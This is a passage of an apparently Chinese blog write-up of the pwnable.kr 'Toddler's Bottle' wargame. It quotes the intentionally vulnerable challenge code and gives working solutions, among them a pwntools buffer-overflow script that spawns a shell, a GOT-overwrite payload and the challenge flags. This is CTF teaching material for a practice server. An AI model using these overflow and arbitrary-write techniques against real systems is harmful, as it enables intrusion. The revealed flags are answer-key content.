<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>pwnable.kr - Toddler&#39;s Bottle | schemr&#39;s blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="[fd]   简介   Mommy! what is a file descriptor in Linux?  * try to play the wargame your self but if you are ABSOLUTE beginner, follow this tutorial link: https://youtu.be/971eZhMHQQw  ssh fd@pwnable.k">
<meta name="keywords" content="writeup,pwnable.kr,pwn">
<meta property="og:type" content="article">
<meta property="og:title" content="pwnable.kr - Toddler&#39;s Bottle">
<meta property="og:url" content="https://yintianliang.github.io/2018/05/04/pwnable.kr_Toddler's Bottle/index.html">
<meta property="og:site_name" content="schemr&#39;s blog">
<meta property="og:description" content="[fd]   简介   Mommy! what is a file descriptor in Linux?  * try to play the wargame your self but if you are ABSOLUTE beginner, follow this tutorial link: https://youtu.be/971eZhMHQQw  ssh fd@pwnable.k">
<meta property="og:locale" content="default">
<meta property="og:updated_time" content="2018-05-08T01:12:59.876Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="pwnable.kr - Toddler&#39;s Bottle">
<meta name="twitter:description" content="[fd]   简介   Mommy! what is a file descriptor in Linux?  * try to play the wargame your self but if you are ABSOLUTE beginner, follow this tutorial link: https://youtu.be/971eZhMHQQw  ssh fd@pwnable.k">
  
    <link rel="alternate" href="/atom.xml" title="schemr&#39;s blog" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    
  
  <link rel="stylesheet" href="/css/style.css">
  

</head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    
    <div id="header-inner" class="inner">
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="搜索"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://yintianliang.github.io"></form>
      </div>
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">首页</a>
        
          <a class="main-nav-link" href="/archives">归档</a>
        
          <a class="main-nav-link" href="/about">关于</a>
        
      </nav>
      
    </div>
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">schemr&#39;s blog</a>
      </h1>
      
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main"><article id="post-pwnable.kr_Toddler&#39;s Bottle" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/05/04/pwnable.kr_Toddler's Bottle/" class="article-date">
  <time datetime="2018-05-04T02:19:00.000Z" itemprop="datePublished">2018-05-04</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/writeup/">writeup</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      pwnable.kr - Toddler&#39;s Bottle
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <!-- Table of Contents -->
        
        



<div id="outline-container-sec-1" class="outline-2">
<h2 id="sec-1">[fd]</h2>
<div class="outline-text-2" id="text-1">
</div><div id="outline-container-sec-1-1" class="outline-3">
<h3 id="sec-1-1">简介</h3>
<div class="outline-text-3" id="text-1-1">
<pre class="example">
Mommy! what is a file descriptor in Linux?

* try to play the wargame your self but if you are ABSOLUTE beginner, follow this tutorial link:
https://youtu.be/971eZhMHQQw

ssh fd@pwnable.kr -p2222 (pw:guest)
</pre>

<a id="more"></a>
</div>
</div>
<div id="outline-container-sec-1-2" class="outline-3">
<h3 id="sec-1-2">分析</h3>
<div class="outline-text-3" id="text-1-2">
<p>
ls可以看到三个文件, 其中flag文件无法直接读取(好像是废话&#x2026;)
</p>
<pre class="example">
fd@ubuntu:~$ ls
fd  fd.c  flag
fd@ubuntu:~$ cat flag
cat: flag: Permission denied
</pre>


<p>
flag.c 内容如下
</p>
<div class="org-src-container">

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">32</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>* envp[])</span></span>{</span><br><span class="line">    <span class="keyword">if</span>(argc&lt;<span class="number">2</span>){</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"pass argv[1] a number\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">int</span> fd = atoi( argv[<span class="number">1</span>] ) - <span class="number">0x1234</span>;</span><br><span class="line">    <span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">    len = read(fd, buf, <span class="number">32</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(<span class="string">"LETMEWIN\n"</span>, buf)){</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"good job :)\n"</span>);</span><br><span class="line">        system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"learn about Linux file IO\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></table></figure>
</div>

<p>
发现获得flag的要求是传入n, 使得 read 从 n - 0x1234 读取字符串, 
</p>

<p>
再判断该字符串是否与 LETMEWIN 相等
</p>

<p>
Google 一下获知以下内容
</p>

<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col class="right">

<col class="left">
</colgroup>
<tbody>
<tr>
<td class="right">Value</td>
<td class="left">Name</td>
</tr>

<tr>
<td class="right">0</td>
<td class="left">stdin</td>
</tr>

<tr>
<td class="right">1</td>
<td class="left">stdout</td>
</tr>

<tr>
<td class="right">2</td>
<td class="left">stderr</td>
</tr>
</tbody>
</table>

<p>
那么 n 应该为 0 + 0x1234 = 4660
</p>

<pre class="example">
fd@ubuntu:~$ ./fd 4660
LETMEWIN
good job :)
mommy! I think I know what a file descriptor is!!
</pre>

<p>
flag 为 <code>mommy! I think I know what a file descriptor is!!</code>
</p>
</div>
</div>
</div>
<div id="outline-container-sec-2" class="outline-2">
<h2 id="sec-2">[collision]</h2>
<div class="outline-text-2" id="text-2">
</div><div id="outline-container-sec-2-1" class="outline-3">
<h3 id="sec-2-1">简介</h3>
<div class="outline-text-3" id="text-2-1">
<pre class="example">
Daddy told me about cool MD5 hash collision today.
I wanna do something like that too!

ssh col@pwnable.kr -p2222 (pw:guest)
</pre>
</div>
</div>

<div id="outline-container-sec-2-2" class="outline-3">
<h3 id="sec-2-2">分析</h3>
<div class="outline-text-3" id="text-2-2">
<p>
col.c内容如下
</p>

<div class="org-src-container">

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> hashcode = <span class="number">0x21DD09EC</span>;</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">check_password</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* p)</span></span>{</span><br><span class="line">    <span class="keyword">int</span>* ip = (<span class="keyword">int</span>*)p;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++){</span><br><span class="line">        res += ip[i];</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>{</span><br><span class="line">    <span class="keyword">if</span>(argc&lt;<span class="number">2</span>){</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"usage : %s [passcode]\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>]) != <span class="number">20</span>){</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"passcode length should be 20 bytes\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(hashcode == check_password( argv[<span class="number">1</span>] )){</span><br><span class="line">        system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"wrong passcode.\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
</div>

<p>
我们的目标是传入一个字符串
使得 check_password 的校验值为 0x21DD09EC
</p>

<p>
check_passcode 将传入的 char* 强制转换为 int* 再相加
</p>


<p>
一开始是想写脚本碰撞, 后来发现这个算法很简单, 完全可以手动构造一个
</p>

<p>
hashcode = 0x21DD09EC = 0x06C5CEC8*4 + 0x06C5CECC
</p>

<p>
只需要注意小端序与python版本, py3可能是默认编码是UTF-8的原因
直接使用Python3不好处理
</p>

<pre class="example">
col@ubuntu:~$ ./col $(python2 -c "print('\xc8\xce\xc5\x06'*4+'\xcc\xce\xc5\x06')")
daddy! I just managed to create a hash collision :)
</pre>

<p>
flag 为 <code>daddy! I just managed to create a hash collision :)</code>
</p>
</div>
</div>
</div>
<div id="outline-container-sec-3" class="outline-2">
<h2 id="sec-3">bof</h2>
<div class="outline-text-2" id="text-3">
</div><div id="outline-container-sec-3-1" class="outline-3">
<h3 id="sec-3-1">简介</h3>
<div class="outline-text-3" id="text-3-1">
<pre class="example">
Nana told me that buffer overflow is one of the most common software vulnerability. 
Is that true?

Download : http://pwnable.kr/bin/bof
Download : http://pwnable.kr/bin/bof.c

Running at : nc pwnable.kr 9000
</pre>
</div>
</div>

<div id="outline-container-sec-3-2" class="outline-3">
<h3 id="sec-3-2">分析</h3>
<div class="outline-text-3" id="text-3-2">
<p>
首先看看 bof.c 内容
</p>

<div class="org-src-container">

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span> key)</span></span>{</span><br><span class="line">    <span class="keyword">char</span> overflowme[<span class="number">32</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"overflow me : "</span>);</span><br><span class="line">    gets(overflowme);   <span class="comment">// smash me!</span></span><br><span class="line">    <span class="keyword">if</span>(key == <span class="number">0xcafebabe</span>){</span><br><span class="line">        system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span>{</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Nah..\n"</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>{</span><br><span class="line">    func(<span class="number">0xdeadbeef</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
</div>

<p>
溢出点是 gets 函数
</p>

<p>
目标很简单, 一直溢出到 func 参数部分被 0xcafebabe 覆盖即可
</p>


<p>
看一下二进制文件, 确认是32位
</p>

<pre class="example">
&gt; checksec --file bof
[*] '/home/zhonghua/writeup/pwnable.kr/bof'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
</pre>

<p>
拖进 IDA , 反编译得知要覆盖 0x2c + 0x4 + 0x4 才到参数部分
</p>

<div class="org-src-container">

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> __<span class="function">cdecl <span class="title">func</span><span class="params">(<span class="keyword">int</span> a1)</span></span><br><span class="line"></span>{</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+1Ch] [ebp-2Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+3Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"overflow me : "</span>);</span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  <span class="keyword">if</span> ( a1 == -<span class="number">889275714</span> )</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Nah.."</span>);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
</div>

<p>
直接用 pwntools 写
</p>

<p>
在本地是毫无悬念地通过了, 然而远程服务器试了几次才过
</p>

<p>
比较迷
</p>

<div class="org-src-container">

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'DEBUG'</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">'pwnable.kr'</span>, <span class="number">9000</span>)</span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">'a'</span> * (<span class="number">0x2C</span> + <span class="number">0x8</span>), <span class="number">0xcafebabe</span>])</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
</div>

<p>
flag为 <code>daddy, I just pwned a buFFer :)</code>
</p>
</div>
</div>
</div>
<div id="outline-container-sec-4" class="outline-2">
<h2 id="sec-4">flag</h2>
<div class="outline-text-2" id="text-4">
</div><div id="outline-container-sec-4-1" class="outline-3">
<h3 id="sec-4-1">简介</h3>
<div class="outline-text-3" id="text-4-1">
<pre class="example">
Papa brought me a packed present! let's open it.

Download : http://pwnable.kr/bin/flag

This is reversing task. all you need is binary
</pre>

<p>
二进制世家啊这是
</p>
</div>
</div>

<div id="outline-container-sec-4-2" class="outline-3">
<h3 id="sec-4-2">分析</h3>
<div class="outline-text-3" id="text-4-2">
<p>
file一下flag, 得知是64位ELF
</p>

<pre class="example">
&gt; file flag
flag: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, stripped
</pre>

<p>
chmod +x后执行一下
</p>

<pre class="example">
&gt; chmod +x flag
&gt; ./flag
I will malloc() and strcpy the flag there. take it.
</pre>

<p>
但是这个文件 IDA 打开就只要三个函数, 完全看不懂在干嘛&#x2026;
</p>

<p>
下断点在strcpy处也不行, 似乎是因为strip过的原因
</p>

<p>
在IDA各个视图间切换的的时候, 突然看到了Hex视图里有upx的字样,
仔细一看这个文件是upx压缩过的
</p>

<p>
那就没问题了, <code>upx -d</code> 解压文件
</p>

<p>
再拖入IDA, 发现flag是以明文存储, 直接复制
</p>

<p>
得到flag <code>UPX...? sounds like a delivery service :)</code>
</p>
</div>
</div>
</div>

<div id="outline-container-sec-5" class="outline-2">
<h2 id="sec-5">passcode</h2>
<div class="outline-text-2" id="text-5">
</div><div id="outline-container-sec-5-1" class="outline-3">
<h3 id="sec-5-1">简介</h3>
<div class="outline-text-3" id="text-5-1">
<pre class="example">
Mommy told me to make a passcode based login system.
My initial C code was compiled without any error!
Well, there was some compiler warning, but who cares about that?

ssh passcode@pwnable.kr -p2222 (pw:guest)
</pre>
</div>
</div>

<div id="outline-container-sec-5-2" class="outline-3">
<h3 id="sec-5-2">分析</h3>
<div class="outline-text-3" id="text-5-2">
<p>
连上去ls一下
flag + 题目名 + 题目名.c 的熟悉配置
</p>

<div class="org-src-container">

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">login</span><span class="params">()</span></span>{</span><br><span class="line">    <span class="keyword">int</span> passcode1;</span><br><span class="line">    <span class="keyword">int</span> passcode2;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"enter passcode1 : "</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, passcode1);</span><br><span class="line">    fflush(<span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ha! mommy told me that 32bit is vulnerable to bruteforcing :)</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"enter passcode2 : "</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, passcode2);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"checking...\n"</span>);</span><br><span class="line">    <span class="keyword">if</span>(passcode1==<span class="number">338150</span> &amp;&amp; passcode2==<span class="number">13371337</span>){</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Login OK!\n"</span>);</span><br><span class="line">        system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span>{</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Login Failed!\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">welcome</span><span class="params">()</span></span>{</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"enter you name : "</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%100s"</span>, name);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Welcome %s!\n"</span>, name);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>{</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Toddler's Secure Login System 1.0 beta.\n"</span>);</span><br><span class="line"></span><br><span class="line">    welcome();</span><br><span class="line">    login();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// something after login...</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Now I can safely trust you that you have credential :)\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;   </span><br><span class="line">}</span><br></pre></td></tr></table></figure>
</div>

<p>
gcc编译一下, 果然有warning
</p>

<pre class="example">
passcode.c: In function ‘login’:
passcode.c:9:8: warning: format ‘%d’ expects argument of type ‘int *’, but argument 2 has type ‘int’ [-Wformat=]
  scanf("%d", passcode1);
        ^
passcode.c:14:15: warning: format ‘%d’ expects argument of type ‘int *’, but argument 2 has type ‘int’ [-Wformat=]
         scanf("%d", passcode2);
</pre>

<p>
scanf的参数没有取地址&#x2026;这鬼知道我的数据被存到哪儿去了
</p>

<p>
Welcome处可以溢出一个字节&#x2026;.然而并没有什么卵用
</p>

<p>
passcode1和passcode2的值看起来完全没有办法改变
</p>

<p>
顺着以下思路
</p>

<p>
passcode的值没有变-&gt;内容为随机值?-&gt;说随机也不准确, 内存中这个地方原来是什么就是什么-&gt;
原来这里是什么值?-&gt; !是name的值
</p>

<p>
因为
</p>

<p>
338150 = 0x000528E6
13371337 = 00CC07C9
</p>

<p>
那么只要将这两个数字以字符串形式输入就行了
</p>

<p>
于是 <code>python -c 'print "\xE6\x28\x05\x00\xC9\x07\xCC\x00"'|./passcode</code>
</p>

<p>
果不其然地失败了
</p>

<p>
仔细想想好像应该加在末尾才对, 试了试还是失败了
</p>

<p>
又想了想某些程序开了Canary, 除了代码中声明的那些变量可能还有Canary变量在buffer中
</p>

<p>
emm&#x2026;&#x2026;还是把文件拖下来用IDA分析一下比较好
</p>

<p>
welcome参数的栈结构   login函数的栈结构
</p>
<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col class="right">

<col class="left">

<col class="left">

<col class="right">

<col class="left">
</colgroup>
<tbody>
<tr>
<td class="right">0x70</td>
<td class="left">name</td>
<td class="left">&#xa0;</td>
<td class="right">&#xa0;</td>
<td class="left">&#xa0;</td>
</tr>

<tr>
<td class="right">&#xa0;</td>
<td class="left">&#xa0;</td>
<td class="left">&#xa0;</td>
<td class="right">0x10</td>
<td class="left">passcode1</td>
</tr>

<tr>
<td class="right">0x0C</td>
<td class="left">canary</td>
<td class="left">&#xa0;</td>
<td class="right">0x0C</td>
<td class="left">passcode2</td>
</tr>

<tr>
<td class="right">0x00</td>
<td class="left">ebp</td>
<td class="left">&#xa0;</td>
<td class="right">0x00</td>
<td class="left">ebp</td>
</tr>
</tbody>
</table>



<p>
呆呆的.jpg
</p>

<p>
passcode2的位置是原先canary的位置, 那passcode2的值我似乎完全控制不了&#x2026;.
</p>

<p>
不过我可以控制passcode1的值, 再搭配没有取地址的scanf函数, 我就拥有了任意地址写的能力
</p>

<p>
然而经验不足还是不知道有这种能力能干啥
</p>

<p>
Google一番后了解到拥有任意地址写的能力以后我们可以改PLT表, 相当于Hook任意函数?
</p>

<p>
那么这个地方我们可以利用name让passcode1的值为PLT表中printf函数项的地址 0x0804A03C
</p>

<pre class="example">
&gt; readelf -r passcode

重定位节 '.rel.dyn' 位于偏移量 0x388 含有 2 个条目：
 偏移量     信息    类型              符号值      符号名称
08049ff0  00000606 R_386_GLOB_DAT    00000000   __gmon_start__
0804a02c  00000b05 R_386_COPY        0804a02c   stdin@GLIBC_2.0

重定位节 '.rel.plt' 位于偏移量 0x398 含有 9 个条目：
 偏移量     信息    类型              符号值      符号名称
0804a000  00000107 R_386_JUMP_SLOT   00000000   printf@GLIBC_2.0
0804a004  00000207 R_386_JUMP_SLOT   00000000   fflush@GLIBC_2.0
0804a008  00000307 R_386_JUMP_SLOT   00000000   __stack_chk_fail@GLIBC_2.4
0804a00c  00000407 R_386_JUMP_SLOT   00000000   puts@GLIBC_2.0
0804a010  00000507 R_386_JUMP_SLOT   00000000   system@GLIBC_2.0
0804a014  00000607 R_386_JUMP_SLOT   00000000   __gmon_start__
0804a018  00000707 R_386_JUMP_SLOT   00000000   exit@GLIBC_2.0
0804a01c  00000807 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0
0804a020  00000907 R_386_JUMP_SLOT   00000000   __isoc99_scanf@GLIBC_2.7
</pre>



<p>
然后在这个地址写入调用system函数的汇编语句的位置 0x080485E3 = 134514147
</p>

<div class="org-src-container">

<figure class="highlight"><table><tr><td class="code"><pre><span class="line">.text:080485E3                 mov     dword ptr [esp], offset command ; &#34;/bin/cat flag&#34;&#10;.text:080485EA                 call    _system</span><br></pre></td></tr></table></figure>
</div>


<pre class="example">
passcode@ubuntu:~$ python -c 'print "a" * 96 + "\x00\xA0\x04\x08" + "134514147"'|./passcode 
Toddler's Secure Login System 1.0 beta.
enter you name : Welcome aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!
Sorry mom.. I got confused about scanf usage :(
enter passcode1 : Now I can safely trust you that you have credential :)
</pre>


<p>
flag为 <code>Sorry mom.. I got confused about scanf usage :(</code>
</p>
</div>
</div>
</div>
<div id="outline-container-sec-6" class="outline-2">
<h2 id="sec-6">random</h2>
<div class="outline-text-2" id="text-6">
</div><div id="outline-container-sec-6-1" class="outline-3">
<h3 id="sec-6-1">简介</h3>
<div class="outline-text-3" id="text-6-1">
<pre class="example">
Daddy, teach me how to use random value in programming!

ssh random@pwnable.kr -p2222 (pw:guest)
</pre>
</div>
</div>

<div id="outline-container-sec-6-2" class="outline-3">
<h3 id="sec-6-2">分析</h3>
<div class="outline-text-3" id="text-6-2">
<p>
先 <code>cat random.c</code> 看内容
</p>

<div class="org-src-container">

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>{</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> random;</span><br><span class="line">    random = rand();    <span class="comment">// random value!</span></span><br><span class="line"></span><br><span 